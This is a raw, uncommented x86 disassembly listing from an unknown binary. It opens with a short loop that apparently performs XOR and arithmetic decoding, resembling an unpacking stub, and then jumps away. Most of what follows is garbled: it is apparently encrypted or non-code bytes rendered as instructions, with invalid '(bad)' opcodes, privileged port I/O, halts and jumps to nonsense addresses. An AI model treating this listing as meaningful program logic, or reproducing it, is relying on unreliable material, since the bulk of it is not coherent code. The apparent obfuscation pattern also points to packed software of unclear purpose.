  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a278
  40a251:	fdiv   st(1),st
  40a253:	or     edx,eax
  40a255:	add    eax,0x5f4e7c7c
  40a25a:	jl     0x40a2d8
  40a25c:	cmp    BYTE PTR [edi],bl
  40a25e:	stos   BYTE PTR es:[edi],al
  40a25f:	out    0xc,eax
  40a261:	scas   al,BYTE PTR es:[edi]
  40a262:	test   al,0xd6
  40a264:	hlt    
  40a265:	mov    al,ds:0xb8cf22dc
  40a26a:	sub    ebx,ecx
  40a26c:	dec    esi
  40a26d:	fcmovnbe st,st(6)
  40a26f:	in     eax,dx
  40a270:	cmp    ecx,DWORD PTR [ebp-0x6b]
  40a273:	cmp    eax,ecx
  40a275:	in     al,0xd
  40a277:	cmp    bh,BYTE PTR [eax-0x7878eb48]
  40a27d:	fs sahf 
  40a27f:	pop    ds
  40a280:	jg     0x40a20a
  40a282:	pop    es
  40a283:	ja     0x40a249
  40a285:	lds    esp,FWORD PTR [edi+0x42c197bc]
  40a28b:	jg     0x40a2ac
  40a28d:	jb     0x40a230
  40a28f:	cmp    ah,BYTE PTR [esi+0x42]
  40a292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a293:	cmp    eax,0x579923cc
  40a298:	scas   eax,DWORD PTR es:[edi]
  40a299:	out    0xbc,al
  40a29b:	mov    cl,0xb0
  40a29d:	arpl   WORD PTR [edx],bx
  40a29f:	xor    eax,0x7f16f6b
  40a2a4:	and    al,0x91
  40a2a6:	cli    
  40a2a7:	mov    edi,DWORD PTR [esi+0x2c]
  40a2aa:	(bad)  
  40a2ab:	dec    esi
  40a2ac:	inc    esp
  40a2ad:	clc    
  40a2ae:	repnz (bad) 
  40a2b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2b1:	dec    ebp
  40a2b2:	adc    DWORD PTR [eax],0xffffff9b
  40a2b5:	into   
  40a2b6:	mov    dl,0x4f
  40a2b8:	test   al,0x81
  40a2ba:	icebp  
  40a2bb:	dec    eax
  40a2bc:	sub    cl,bl
  40a2be:	lock cwde 
  40a2c0:	popf   
  40a2c1:	ror    DWORD PTR [esi-0xd],0xd8
  40a2c5:	pushf  
  40a2c6:	dec    ecx
  40a2c7:	pusha  
  40a2c8:	or     ch,BYTE PTR [edx+ecx*4-0x44]
  40a2cc:	or     edx,DWORD PTR [esi+0x5]
  40a2cf:	loopne 0x40a2e1
  40a2d1:	imul   eax,DWORD PTR [esi+0xe],0xc50aa9a2
  40a2d8:	cmp    eax,edi
  40a2da:	sub    ebx,edi
  40a2dc:	sub    esi,DWORD PTR [ebp-0x24]
  40a2df:	ins    BYTE PTR es:[edi],dx
  40a2e0:	sahf   
  40a2e1:	add    esp,ecx
  40a2e3:	es xor eax,0xb13592ef
  40a2e9:	sbb    ecx,DWORD PTR [ecx-0x68]
  40a2ec:	stos   BYTE PTR es:[edi],al
  40a2ed:	mov    dh,0x7b
  40a2ef:	pop    esp
  40a2f0:	inc    edi
  40a2f1:	test   BYTE PTR [ebx+0x5f],bl
  40a2f4:	call   0xa56f6334
  40a2f9:	popf   
  40a2fa:	and    ebx,ebp
  40a2fc:	or     DWORD PTR [esi],0xffffff80
  40a2ff:	sbb    edi,edx
  40a301:	push   ebp
  40a302:	sbb    BYTE PTR [eax],0xeb
  40a305:	es idiv ch
  40a308:	gs mov ecx,0x9dcce890
  40a30e:	xchg   edi,eax
  40a30f:	mov    dl,0xaf
  40a311:	push   esi
  40a312:	(bad)  
  40a313:	dec    ebp
  40a314:	add    ch,BYTE PTR [edi-0x4c794b6e]
  40a31a:	rcl    BYTE PTR [esi],1
  40a31c:	pop    esi
  40a31d:	call   0xa173b938
  40a322:	test   BYTE PTR [esi+0x6c],dh
  40a325:	(bad)  
  40a326:	xchg   edi,eax
  40a327:	cmp    bl,ch
  40a329:	and    edi,ecx
  40a32b:	pop    edx
  40a32c:	sub    bh,0x18
  40a32f:	imul   esp,DWORD PTR ds:0xd4587574,0x8d433cc
  40a339:	ret    
  40a33a:	jns    0x40a34c
  40a33c:	outs   dx,DWORD PTR ds:[esi]
  40a33d:	ss int3 
  40a33f:	test   eax,0xca59422e
  40a344:	mov    ecx,0xb8d1f93b
  40a349:	push   ds
  40a34a:	pop    esi
  40a34b:	mov    dh,0xc6
  40a34d:	aam    0xed
  40a34f:	and    eax,0x8b3ec872
  40a354:	or     ah,BYTE PTR es:[ecx]
  40a357:	sbb    al,0x94
  40a359:	push   edi
  40a35a:	xchg   edx,eax
  40a35b:	scas   al,BYTE PTR es:[edi]
  40a35c:	or     eax,0x24b6b1b1
  40a361:	js     0x40a3ab
  40a363:	jo     0x40a36b
  40a365:	leave  
  40a366:	cli    
  40a367:	fisttp WORD PTR [ebp-0x1da7f41f]
  40a36d:	cli    
  40a36e:	dec    esi
  40a36f:	jp     0x40a3ae
  40a371:	sbb    esi,ecx
  40a373:	mov    dh,0xe2
  40a375:	pop    ebp
  40a376:	push   es
  40a377:	sbb    eax,0x265abab6
  40a37c:	mov    bl,0x65
  40a37e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a37f:	and    eax,0x21a76657
  40a384:	and    eax,0x30a8c4eb
  40a389:	scas   eax,DWORD PTR es:[edi]
  40a38a:	mov    esi,DWORD PTR [ebx-0x423cf3e]
  40a390:	mov    al,ds:0xec7c441a
  40a395:	inc    edi
  40a396:	sbb    al,0xb6
  40a398:	sahf   
  40a399:	test   dl,dh
  40a39b:	mov    al,ds:0x1486c4dd
  40a3a0:	inc    esi
  40a3a1:	ds jbe 0x40a423
  40a3a4:	and    ebp,ebp
  40a3a6:	or     al,0x1f
  40a3a8:	jne    0x40a3f8
  40a3aa:	hlt    
  40a3ab:	xchg   ebx,eax
  40a3ac:	push   cs
  40a3ad:	add    al,0x30
  40a3af:	fsub   st(6),st
  40a3b1:	mov    esp,0x2ce5d3ae
  40a3b6:	adc    ch,bh
  40a3b8:	lds    edi,FWORD PTR ds:0xf97f66ff
  40a3be:	out    0x8c,eax
  40a3c0:	jbe    0x40a3f5
  40a3c2:	sar    ecx,1
  40a3c4:	cmc    
  40a3c5:	in     al,0x21
  40a3c7:	es call 0x9c96:0x81862c43
  40a3cf:	pop    ecx
  40a3d0:	or     bl,BYTE PTR [edi-0x1e0b1163]
  40a3d6:	push   ebp
  40a3d7:	es es jno 0x40a3ad
  40a3db:	test   al,0x2a
  40a3dd:	cmp    al,0x14
  40a3df:	je     0x40a384
  40a3e1:	mov    ecx,0x2f6c20ca
  40a3e6:	mov    al,bl
  40a3e8:	and    eax,0x8b920b36
  40a3ed:	xor    ah,bh
  40a3ef:	cbw    
  40a3f1:	js     0x40a401
  40a3f3:	dec    esi
  40a3f4:	inc    eax
  40a3f5:	xor    eax,DWORD PTR [esi+ebp*8-0x5]
  40a3f9:	pop    es
  40a3fa:	cld    
  40a3fb:	adc    eax,eax
  40a3fd:	inc    ebp
  40a3fe:	adc    bh,0x82
  40a401:	les    eax,FWORD PTR es:[edi+0x23]
  40a405:	js     0x40a3b8
  40a407:	pop    ebp
  40a408:	mov    ch,0xad
  40a40a:	mov    ch,0x82
  40a40c:	scas   al,BYTE PTR es:[edi]
  40a40d:	stos   BYTE PTR es:[edi],al
  40a40e:	in     eax,0x0
  40a410:	sbb    eax,0x6b1eb15a
  40a415:	mov    ah,0x65
  40a417:	nop
  40a418:	(bad)  
  40a41a:	sub    al,0x81
  40a41c:	push   ss
  40a41d:	xlat   BYTE PTR ds:[ebx]
  40a41e:	add    bh,BYTE PTR [ebp-0x50]
  40a421:	sub    DWORD PTR [esp+ebx*8-0x3c958bd5],ecx
  40a428:	fwait
  40a429:	jbe    0x40a43d
  40a42b:	pushf  
  40a42c:	mov    ?,WORD PTR [edx]
  40a42e:	mov    esi,0xc07597a7
  40a433:	pusha  
  40a434:	jo     0x40a414
  40a436:	ja     0x40a458
  40a438:	sub    al,0x1a
  40a43a:	mov    bh,0x59
  40a43c:	sbb    eax,edx
  40a43e:	loope  0x40a484
  40a440:	inc    esi
  40a441:	and    DWORD PTR [ecx+0x5a],edi
  40a444:	push   edx
  40a445:	cs add al,0x42
  40a448:	mov    dh,0x9b
  40a44a:	pop    ds
  40a44b:	loopne 0x40a481
  40a44d:	adc    eax,0xfb06ab19
  40a452:	fstp   TBYTE PTR [edi-0x4c]
  40a455:	rcl    BYTE PTR [ebx],1
  40a457:	add    BYTE PTR [ebp+0x9],bh
  40a45a:	add    BYTE PTR [ecx+0x6b98e4fc],0xed
  40a461:	enter  0xdbf3,0x57
  40a465:	and    edi,edx
  40a467:	and    al,0xcb
  40a469:	les    ebp,FWORD PTR [ebp-0x583dbed]
  40a46f:	ret    0x9cf0
  40a472:	sub    eax,0x8eb16a2f
  40a477:	inc    esi
  40a478:	in     al,0x25
  40a47a:	cs jle 0x40a4be
  40a47d:	push   cs
  40a47e:	stos   DWORD PTR es:[edi],eax
  40a47f:	out    dx,eax
  40a480:	sub    eax,0xbc85dfc5
  40a485:	mov    bh,0xf1
  40a487:	in     al,0xfc
  40a489:	js     0x40a4ff
  40a48b:	add    ecx,DWORD PTR [edi+0x7cb017a0]
  40a491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a492:	push   0x4a
  40a494:	outs   dx,DWORD PTR ds:[esi]
  40a495:	pop    ds
  40a496:	sbb    eax,0x369fa27e
  40a49b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a49c:	lods   al,BYTE PTR ds:[esi]
  40a49d:	mov    edi,0x48be31f0
  40a4a2:	inc    edx
  40a4a3:	jl     0x40a516
  40a4a5:	xor    al,0x9b
  40a4a7:	cmp    cl,0x59
  40a4aa:	retf   0x5df1
  40a4ad:	iret   
  40a4ae:	xor    bl,BYTE PTR [edi+0x199d01ed]
  40a4b4:	mov    ah,al
  40a4b6:	clc    
  40a4b7:	in     eax,0x35
  40a4b9:	mov    ds:0x432aafcd,eax
  40a4be:	or     ecx,DWORD PTR [edi]
  40a4c0:	pop    esi
  40a4c1:	and    ah,ch
  40a4c3:	fwait
  40a4c4:	xor    al,0xfe
  40a4c6:	xor    DWORD PTR [eax+ebp*2],esp
  40a4c9:	aas    
  40a4ca:	fiadd  DWORD PTR [edx]
  40a4cc:	adc    eax,0x6ef6c27b
  40a4d1:	xlat   BYTE PTR ds:[ebx]
  40a4d2:	jmp    0x9489:0xa2dc83d9
  40a4d9:	bound  esi,QWORD PTR ds:0x931f307a
  40a4df:	nop
  40a4e0:	les    esp,FWORD PTR [edi+ebp*4+0x969a00b]
  40a4e7:	push   ecx
  40a4e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4e9:	push   0x1ca5af30
  40a4ee:	stos   DWORD PTR es:[edi],eax
  40a4ef:	jnp    0x40a53f
  40a4f1:	scas   eax,DWORD PTR es:[edi]
  40a4f2:	cmp    al,0xca
  40a4f4:	mov    ch,0x1a
  40a4f6:	add    ah,BYTE PTR [esi-0x9]
  40a4f9:	inc    ebp
  40a4fa:	sub    al,0x10
  40a4fc:	pop    eax
  40a4fd:	dec    ebx
  40a4fe:	js     0x40a512
  40a500:	sub    BYTE PTR [ebp+0x5f],dl
  40a503:	mov    al,0x11
  40a505:	lods   al,BYTE PTR ds:[esi]
  40a506:	pop    esp
  40a507:	dec    ebx
  40a508:	cmc    
  40a509:	sbb    al,0x63
  40a50b:	pop    edi
  40a50c:	jns    0x40a561
  40a50e:	or     DWORD PTR [edx+ebp*8],edi
  40a511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a512:	shl    DWORD PTR [edi],0xc2
  40a515:	rcr    BYTE PTR [ecx],0xab
  40a518:	pop    ebx
  40a519:	fdivr  QWORD PTR [edx]
  40a51b:	in     al,0xed
  40a51d:	inc    esp
  40a51e:	ror    DWORD PTR [edx-0x46],cl
  40a521:	out    0xa2,al
  40a523:	(bad)  
  40a525:	sbb    DWORD PTR [edx+0x5],0x52a6a09d
  40a52c:	xchg   bl,al
  40a52e:	(bad)  
  40a52f:	(bad)  [edi+0x40]
  40a532:	cmp    esi,edx
  40a534:	mov    bh,0x7f
  40a536:	jns    0x40a4d0
  40a538:	mov    esp,0x7970fd2b
  40a53d:	loope  0x40a53e
  40a53f:	or     BYTE PTR [eax],bh
  40a541:	cs mov dl,0xd1
  40a544:	and    al,0xe6
  40a546:	scas   eax,DWORD PTR es:[edi]
  40a547:	inc    ebp
  40a548:	rcr    BYTE PTR [edi-0x1af6e07b],0xc7
  40a54f:	fcmovne st,st(0)
  40a551:	int3   
  40a552:	mov    ecx,0xc936c627
  40a557:	scas   eax,DWORD PTR es:[edi]
  40a558:	or     ebp,DWORD PTR [esi-0x24f2bb80]
  40a55e:	arpl   dx,bx
  40a560:	push   es
  40a561:	pop    esp
  40a562:	and    DWORD PTR [edx+0x1d],ecx
  40a565:	ins    DWORD PTR es:[edi],dx
  40a566:	sti    
  40a567:	ss js  0x40a587
  40a56a:	xor    eax,0xcce04f5e
  40a56f:	inc    edx
  40a570:	gs xor eax,0xaa6357eb
  40a576:	jmp    0x40a5a9
  40a578:	je     0x40a5d0
  40a57a:	mov    ds:0xb003ae1d,eax
  40a57f:	stos   DWORD PTR es:[edi],eax
  40a580:	sub    al,0xcc
  40a582:	mov    BYTE PTR [ebp+0x49899757],bh
  40a588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a589:	and    ebp,DWORD PTR [ebp+0xb7312e5]
  40a58f:	retf   0xc24c
  40a592:	inc    esi
  40a593:	mov    WORD PTR [ecx+0x5857dd54],?
  40a599:	mov    al,ds:0xb38110c3
  40a59e:	xchg   esp,eax
  40a59f:	mov    bh,bh
  40a5a1:	aam    0x41
  40a5a3:	cs xor al,0x19
  40a5a6:	out    0x57,eax
  40a5a8:	(bad)  
  40a5aa:	mov    ds:0x2d2ccee3,eax
  40a5af:	repz push ecx
  40a5b1:	xor    eax,0x830a1b49
  40a5b6:	inc    eax
  40a5b7:	push   eax
  40a5b8:	sub    al,0xb9
  40a5ba:	out    dx,al
  40a5bb:	in     al,0xab
  40a5bd:	cmp    DWORD PTR [edx],ebp
  40a5bf:	pop    edi
  40a5c0:	pop    ebx
  40a5c1:	jmp    0x40a5de
  40a5c3:	sub    al,0x5d
  40a5c5:	and    eax,0x76e64d3e
  40a5ca:	sub    DWORD PTR [eax+0x5],edi
  40a5cd:	mov    edi,0x91061414
  40a5d2:	loop   0x40a618
  40a5d4:	bound  edi,QWORD PTR [eax+ebp*2+0x1231932c]
  40a5db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5dc:	adc    edx,DWORD PTR [ecx+0x4]
  40a5df:	mov    edx,fs
  40a5e1:	mov    dl,0x81
  40a5e3:	gs dec ecx
  40a5e5:	cmp    ecx,ebx
  40a5e7:	fsubr  DWORD PTR ds:0xb88ed95c
  40a5ed:	in     eax,0x7d
  40a5ef:	test   al,0xc9
  40a5f1:	jmp    0x40a5d4
  40a5f3:	xor    ecx,DWORD PTR [ebx-0x6c251897]
  40a5f9:	sbb    BYTE PTR [esi+0x60],ch
  40a5fc:	imul   edx,DWORD PTR [ebp+0x3dec45a9],0xffffffd0
  40a603:	gs push ds
  40a605:	dec    eax
  40a606:	mov    bl,0xb9
  40a608:	mov    ecx,ecx
  40a60a:	xchg   BYTE PTR [edx],bl
  40a60c:	xchg   edi,eax
  40a60d:	sahf   
  40a60e:	or     eax,0x37b62cd4
  40a613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a614:	scas   al,BYTE PTR es:[edi]
  40a615:	pusha  
  40a616:	or     al,0x41
  40a618:	aad    0x29
  40a61a:	xchg   ebp,eax
  40a61b:	xchg   esp,eax
  40a61c:	add    BYTE PTR [edi],ah
  40a61e:	(bad)
  40a622:	icebp  
  40a623:	in     eax,0x1d
  40a625:	xlat   BYTE PTR ds:[ebx]
  40a626:	add    al,0xdf
  40a628:	outs   dx,BYTE PTR ds:[esi]
  40a629:	ja     0x40a5ef
  40a62b:	call   0xa1c33b2c
  40a630:	mov    WORD PTR [edi+eax*4+0x8],gs
  40a634:	mov    eax,ds:0x1d327961
  40a639:	or     dl,BYTE PTR [eax+esi*2]
  40a63c:	gs test cl,0x95
  40a640:	rcl    DWORD PTR [ebx+ebx*4-0x6b],0xc3
  40a645:	mov    al,ds:0xc2c9b4b6
  40a64a:	sbb    al,0x83
  40a64c:	hlt    
  40a64d:	add    dh,BYTE PTR [ebp-0x150581e6]
  40a653:	in     eax,0xb4
  40a655:	shr    BYTE PTR [edi-0x3fa918f6],1
  40a65b:	mov    cs,WORD PTR [ebp-0x76]
  40a65e:	(bad)  
  40a65f:	into   
  40a660:	jle    0x40a600
  40a662:	push   esp
  40a663:	fwait
  40a664:	jbe    0x40a6ab
  40a666:	mov    ebp,0x5086aefd
  40a66b:	inc    ebx
  40a66c:	sbb    eax,0xe851e6e2
  40a671:	ret    
  40a672:	sub    BYTE PTR [ecx+0x44],al
  40a675:	pushf  
  40a676:	push   edi
  40a677:	lods   eax,DWORD PTR ds:[esi]
  40a678:	xor    DWORD PTR [eax+0x7d58aa01],ebx
  40a67e:	pusha  
  40a67f:	sbb    eax,0x5f3cbfca
  40a684:	test   BYTE PTR [ecx+0xc0022db],dh
  40a68a:	mov    eax,0x81cd8496
  40a68f:	cli    
  40a690:	xor    DWORD PTR gs:[edx+0x7f],edi
  40a694:	cli    
  40a695:	push   cs
  40a696:	inc    esp
  40a697:	popf   
  40a698:	add    al,BYTE PTR [ebp-0x647ec941]
  40a69e:	sbb    al,0x57
  40a6a0:	cmp    al,0x2b
  40a6a2:	inc    esi
  40a6a3:	mov    ch,0x6
  40a6a5:	xchg   ebx,eax
  40a6a6:	cmp    esi,DWORD PTR [ebp+0x2]
  40a6a9:	jne    0x40a6b4
  40a6ab:	and    al,0x2e
  40a6ad:	jge    0x40a65c
  40a6af:	cmp    DWORD PTR [edx+0x7],edx
  40a6b2:	mov    dh,al
  40a6b4:	add    ch,BYTE PTR [eax-0x38]
  40a6b7:	dec    edi
  40a6b8:	pop    ebp
  40a6b9:	xchg   edx,eax
  40a6ba:	pop    ebp
  40a6bb:	mov    eax,ds:0xc7208abd
  40a6c0:	enter  0xc55b,0x5b
  40a6c4:	ins    DWORD PTR es:[edi],dx
  40a6c5:	or     dh,BYTE PTR [ebx+eax*1-0x59]
  40a6c9:	dec    ecx
  40a6ca:	retf   0xe068
  40a6cd:	rol    BYTE PTR [edx-0x4],cl
  40a6d0:	and    ebp,edi
  40a6d2:	cs mov ah,0x4e
  40a6d5:	add    al,0x77
  40a6d7:	call   0x24b2345a
  40a6dc:	mov    ebp,0xb977fb9f
  40a6e1:	mov    bh,BYTE PTR [esi-0x65]
  40a6e4:	sar    BYTE PTR [edx-0x33],cl
  40a6e7:	mov    dh,0x92
  40a6e9:	mov    bh,0x1c
  40a6eb:	adc    BYTE PTR [eax],ch
  40a6ed:	mov    eax,0xf95f9e0b
  40a6f2:	or     bh,BYTE PTR [ecx]
  40a6f4:	adc    edx,DWORD PTR [eax]
  40a6f6:	mov    bh,BYTE PTR [ebx]
  40a6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6f9:	jge    0x40a768
  40a6fb:	mov    BYTE PTR [ecx+0x17],ch
  40a6fe:	mov    edi,0xeb85e18d
  40a703:	clc    
  40a704:	push   es
  40a705:	cmp    ecx,eax
  40a707:	dec    edi
  40a708:	jle    0x40a718
  40a70a:	pop    ds
  40a70b:	ds push esp
  40a70d:	mov    cl,0x3
  40a70f:	dec    edx
  40a710:	add    dl,dh
  40a712:	js     0x40a77c
  40a714:	mov    DWORD PTR [edx-0x6bbecdd1],0xa2954f27
  40a71e:	push   ebx
  40a71f:	popf   
  40a720:	retf   0x7786
  40a723:	push   edx
  40a724:	push   esi
  40a725:	and    BYTE PTR [edx],ah
  40a727:	sub    al,0xd
  40a729:	pushf  
  40a72a:	mov    WORD PTR ds:0x5cb2b949,ss
  40a730:	and    esi,DWORD PTR [ebx-0x32]
  40a733:	scas   eax,DWORD PTR es:[edi]
  40a734:	es xchg ebx,eax
  40a736:	add    al,BYTE PTR [edx+0x19]
  40a739:	ret    
  40a73a:	and    eax,0x58083ce8
  40a73f:	mov    esp,0xd9bc42e8
  40a744:	pop    ecx
  40a745:	mov    ch,0x6b
  40a747:	lds    edi,FWORD PTR [eax]
  40a749:	mov    al,bh
  40a74b:	jg     0x40a786
  40a74d:	sahf   
  40a74e:	cmp    DWORD PTR [eax-0x12],0x0
  40a752:	jg     0x40a7c9
  40a754:	scas   al,BYTE PTR es:[edi]
  40a755:	outs   dx,BYTE PTR ds:[esi]
  40a756:	and    eax,0x24c03ea
  40a75b:	jmp    0x4c09:0x906832ec
  40a762:	mov    bp,0x773f
  40a766:	imul   edx,DWORD PTR [ebx+0x24],0xffffffc1
  40a76a:	mov    ebx,DWORD PTR [edi-0x410fc229]
  40a770:	pop    esi
  40a771:	ret    0x906c
  40a774:	jne    0x40a7a0
  40a776:	outs   dx,BYTE PTR ds:[esi]
  40a777:	ret    0x6e4b
  40a77a:	test   eax,0x811cb273
  40a77f:	add    bh,BYTE PTR [esi+0x37]
  40a782:	mov    esp,0x3d57bd31
  40a787:	xor    al,0xe
  40a789:	mov    ebx,DWORD PTR [edx+0x68]
  40a78c:	rcl    esp,1
  40a78e:	inc    esp
  40a78f:	jl     0x40a742
  40a791:	mov    DWORD PTR [edi-0x70],edi
  40a794:	inc    ebx
  40a795:	gs push eax
  40a797:	fmulp  st(0),st
  40a799:	or     ebp,0x6b
  40a79c:	cdq    
  40a79d:	push   ss
  40a79e:	mov    dh,0xe4
  40a7a0:	icebp  
  40a7a1:	lea    esp,[esi+0x5b]
  40a7a4:	das    
  40a7a5:	xchg   ebx,eax
  40a7a6:	cmp    ebp,esp
  40a7a8:	mov    edx,DWORD PTR [esi+0x33286eb3]
  40a7ae:	arpl   WORD PTR [edx],ax
  40a7b0:	repnz lock in eax,dx
  40a7b3:	dec    esp
  40a7b4:	ds repnz leave 
  40a7b7:	stos   DWORD PTR es:[edi],eax
  40a7b8:	or     dh,bl
  40a7ba:	shl    dh,1
  40a7bc:	xor    al,0x38
  40a7be:	sbb    cl,BYTE PTR [esi]
  40a7c0:	popa   
  40a7c1:	pop    es
  40a7c2:	dec    esi
  40a7c3:	cli    
  40a7c4:	dec    ebp
  40a7c5:	mov    ch,0x65
  40a7c7:	sub    DWORD PTR ds:0x2fc22e2e,esp
  40a7cd:	(bad)  
  40a7ce:	mov    ebp,0x8cac04c8
  40a7d3:	ret    0x5177
  40a7d6:	jbe    0x40a845
  40a7d8:	ss jl  0x40a822
  40a7db:	lea    edi,[edi+0x47]
  40a7de:	es jns 0x40a76c
  40a7e1:	test   eax,0x76a2312d
  40a7e6:	cs and edx,ebp
  40a7e9:	ret    
  40a7ea:	adc    bl,bl
  40a7ec:	adc    eax,0xa0a7f02e
  40a7f1:	pop    esp
  40a7f2:	jmp    0x40a785
  40a7f4:	dec    ebp
  40a7f5:	and    BYTE PTR [esi],bl
  40a7f7:	xlat   BYTE PTR ds:[ebx]
  40a7f8:	mov    bl,0xca
  40a7fa:	mov    edi,0xc604a527
  40a7ff:	mov    al,ds:0xe3d4f342
  40a804:	cmp    DWORD PTR [ecx-0x21],ebp
  40a807:	cmp    ah,BYTE PTR [esi]
  40a809:	cwde   
  40a80a:	lock sbb bh,al
  40a80d:	fdivp  st(5),st
  40a80f:	xchg   ebp,eax
  40a810:	mov    ah,BYTE PTR [esi]
  40a812:	inc    esi
  40a813:	fistp  WORD PTR [ecx+0x52]
  40a816:	cld    
  40a817:	push   edi
  40a818:	int    0x7e
  40a81a:	paddusw mm5,QWORD PTR [esi+0x33a33416]
  40a821:	les    esp,FWORD PTR [eax+edx*2+0x1f]
  40a825:	imul   eax,DWORD PTR [edi+edx*8],0x11926339
  40a82c:	mov    cl,cl
  40a82e:	jp     0x40a7c0
  40a830:	lahf   
  40a831:	ja     0x40a7e0
  40a833:	outs   dx,BYTE PTR ds:[esi]
  40a834:	jnp    0x40a85b
  40a836:	fcmovnbe st,st(0)
  40a838:	inc    ebx
  40a839:	jmp    0x7201:0x9b46ad72
  40a840:	add    bl,cl
  40a842:	xchg   BYTE PTR [edi-0x2f2969e3],ch
  40a848:	adc    ebx,DWORD PTR [esi+0x6e]
  40a84b:	mov    al,0x51
  40a84d:	mov    ebp,0x47130b3e
  40a852:	and    ebp,DWORD PTR ds:0xc7f16cff
  40a858:	xchg   ebx,eax
  40a859:	push   ds
  40a85a:	ins    BYTE PTR es:[edi],dx
  40a85b:	or     bl,BYTE PTR [eax+0x6c]
  40a85e:	test   al,0xd2
  40a860:	enter  0x83ad,0x7c
  40a864:	pop    edi
  40a865:	jno    0x40a8c2
  40a867:	push   ss
  40a868:	push   ss
  40a869:	mov    ds:0xac50966e,al
  40a86e:	or     eax,0x3810f8d
  40a873:	out    dx,eax
  40a874:	outs   dx,DWORD PTR ds:[esi]
  40a875:	retf   0x3b16
  40a878:	imul   esp,DWORD PTR [ebx-0x3e],0x80e1fb82
  40a87f:	xchg   BYTE PTR [esi-0x19],bh
  40a882:	(bad)  
  40a883:	into   
  40a884:	adc    BYTE PTR [esi+0x6a],al
  40a887:	cs inc ebx
  40a889:	mov    al,ds:0x8d1391b
  40a88e:	add    ah,BYTE PTR [edx+ebp*4]
  40a891:	ins    BYTE PTR es:[edi],dx
  40a892:	aas    
  40a893:	jg     0x40a8db
  40a895:	div    BYTE PTR [ebx-0x43]
  40a898:	sar    BYTE PTR [edx-0x5b],0xfa
  40a89c:	rcl    DWORD PTR [ebx],0xb8
  40a89f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a1:	sbb    al,0x68
  40a8a3:	in     al,0x9c
  40a8a5:	int3   
  40a8a6:	sbb    eax,0xb863fc23
  40a8ab:	sbb    DWORD PTR [edx+0x6e],ebp
  40a8ae:	xchg   DWORD PTR [esi-0x548bb9b5],ebp
  40a8b4:	jae    0x40a8f5
  40a8b6:	sbb    BYTE PTR [edx-0x80],bh
  40a8b9:	jnp    0x40a87b
  40a8bb:	push   ebp
  40a8bc:	lds    edi,FWORD PTR [ecx+0x19]
  40a8bf:	jg     0x40a8f3
  40a8c1:	iret   
  40a8c2:	es retf 
  40a8c4:	jp     0x40a8e7
  40a8c6:	jne    0x40a927
  40a8c8:	call   0xfdc1ffa7
  40a8cd:	psllq  mm3,mm1
  40a8d0:	test   BYTE PTR [edx],bh
  40a8d2:	inc    edx
  40a8d3:	pop    ebp
  40a8d4:	(bad)  
  40a8d5:	jle    0x40a880
  40a8d7:	cdq    
  40a8d8:	clc    
  40a8d9:	icebp  
  40a8da:	mov    edi,ebp
  40a8dc:	add    esp,DWORD PTR [eax-0x78]
  40a8df:	stos   BYTE PTR es:[edi],al
  40a8e0:	ja     0x40a8dd
  40a8e2:	ret    0x6ae6
  40a8e5:	mov    ds:0x8f2028b4,eax
  40a8ea:	cdq    
  40a8eb:	daa    
  40a8ec:	jmp    0x40a96b
  40a8ee:	jmp    FWORD PTR [edi+ebp*4-0x6b0e2892]
  40a8f5:	adc    BYTE PTR [eax],ah
  40a8f7:	dec    ebx
  40a8f8:	popa   
  40a8f9:	inc    ebx
  40a8fa:	adc    eax,0xc3e87d51
  40a8ff:	pop    eax
  40a900:	jne    0x40a8ab
  40a902:	jge    0x40a96e
  40a904:	jnp    0x40a962
  40a906:	jecxz  0x40a8ea
  40a908:	(bad)  
  40a90a:	sahf   
  40a90b:	clc    
  40a90c:	cvtpi2ps xmm2,QWORD PTR [eax-0x39]
  40a910:	push   ss
  40a911:	arpl   WORD PTR [esp+ebp*4],sp
  40a914:	mov    BYTE PTR [edx+edx*2-0xd7060b9],al
  40a91b:	cmc    
  40a91c:	fwait
  40a91d:	repnz cdq 
  40a91f:	xchg   edx,eax
